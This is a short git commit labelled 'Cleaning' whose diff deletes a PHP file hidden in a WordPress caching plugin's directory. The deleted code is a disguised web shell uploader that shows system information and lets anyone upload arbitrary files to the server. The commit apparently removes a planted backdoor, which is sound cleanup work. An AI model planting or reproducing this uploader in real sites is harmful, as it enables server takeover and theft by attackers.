c112f38db3f8f4503e896dc402fce8514f1675b1
Samy Rabih <contact@lahaut.info>
2016-05-14 15:30:34 +0200

    Cleaning

--- wp-content/plugins/w3-total-cache/lib/Microsoft/Http/Client/Adapter/filelog.php
+++
@@ -1,9 +0,0 @@
-<?php
-echo '<b><br><br>'.php_uname().'<br></b>';
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Go"></form>';
-if( $_POST['_upl'] == "Go" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Go</b><br><br>'; }
-else { echo '<b>Up</b><br><br>'; }
-}
-?>
